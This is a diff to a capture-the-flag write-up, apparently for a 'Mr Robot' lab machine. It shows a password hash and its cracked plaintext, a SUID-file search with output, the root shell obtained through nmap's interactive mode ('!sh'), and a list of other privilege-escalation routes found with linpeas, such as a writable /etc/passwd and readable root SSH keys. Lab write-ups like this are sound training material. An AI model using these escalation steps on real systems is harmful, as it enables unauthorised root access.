@@ -341,16 +341,124 @@ https://10.10.125.174/404.php
 
 ![image](https://github.com/user-attachments/assets/aeb9059c-f6d1-4f3e-ac97-d935e46433e3)
 
+---
+---
+---
 
 
-Spawning an interactive shell:
+![image](https://github.com/user-attachments/assets/40f5a23a-42ef-4156-86ee-3ce9d580a844)
+
 
 ```
-python -c 'import pty; pty.spawn("/bin/bash")'
+c3fcd3d76192e4007dfb496cca67e13b
 ```
 
+```
+abcdefghijklmnopqrstuvwxyz
+```
+
+change user to ``robot``
 
 
+
+![image](https://github.com/user-attachments/assets/4527dee4-4773-4210-8ca6-5253c1ca4405)
+
+
+
+
+find all files that work with ``suid/sgid``:
+
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+```
+-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
+-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
+-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
+-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-touchlock
+-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
+-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
+-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-unlock
+-rwxr-sr-x 3 root mail 14344 Sep  3  2018 /usr/bin/mail-lock
+-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
+-rwxr-sr-x 1 root crontab 43720 Feb 13  2020 /usr/bin/crontab
+-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
+-rwxr-sr-x 1 root shadow 84512 Feb  6  2024 /usr/bin/chage
+-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
+-rwxr-sr-x 1 root shadow 31312 Feb  6  2024 /usr/bin/expiry
+-rwxr-sr-x 1 root mail 22680 Oct 11  2019 /usr/bin/dotlockfile
+-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
+-rwxr-sr-x 1 root ssh 350504 Apr 11 12:16 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 17272 Jun  2 18:23 /usr/local/bin/nmap       <<<------------⚠️
+-rwxr-sr-x 1 root utmp 14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwsr-xr-x 1 root root 477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwxr-sr-x 1 root shadow 43160 Jan 10  2024 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 43168 Jan 10  2024 /sbin/pam_extrausers_chkpwd
+```
+
+> in hint say it in nmap
+
+
+in old versions of ``nmap`` if you use:
+
+```
+/usr/local/bin/nmap --interactive
+```
+
+it will open interacitve shell you can get root form it :
+
+```
+!sh
+```
+
+![image](https://github.com/user-attachments/assets/a852996f-cf24-44d0-968a-eee43e4712bc)
+
+
+
+* <details>
+      <summary>preivillage esc using linpeas 🟪🟧✅ (didn't try all this ways)</summary>     
+
+     1- bash version is too old
+
+     ![image](https://github.com/user-attachments/assets/4f36cea1-1727-4694-8731-772a4195eee1)
+
+     so we can use this ``CVE`` TO DO prevESC
+
+     ![image](https://github.com/user-attachments/assets/e97ba4d1-4bbc-422f-9bb0-dda31340843c)
+   
+
+     as we do in ``cat picters_2`` CTF YOU can go to there to see all steps [here](https://github.com/Frankishtien/writeups-reports/blob/main/Cat%20Pictures%202.md)
+
+
+     2- ![image](https://github.com/user-attachments/assets/e1ecf09c-827e-4d93-b5ca-084fcb295a2a)
+
+
+     3- you can read ssh-key for root
+
+      ![image](https://github.com/user-attachments/assets/e76bee45-5b71-4bf0-8ef3-52664dec0ff9)
+
+     4- using ``nmap``
+
+      ![image](https://github.com/user-attachments/assets/af4bbfa7-608f-4451-aba0-304b64945074)
+
+     5- ![image](https://github.com/user-attachments/assets/95f3856e-556f-4d19-aaa2-80010260374d)
+
+     6- writeable ``/etc/passwd``
+
+       ![image](https://github.com/user-attachments/assets/97fbd15f-113f-43d5-9dbc-9427491856d1)
+
+     7- 
+
+     
+              
+</details>
 
 
 
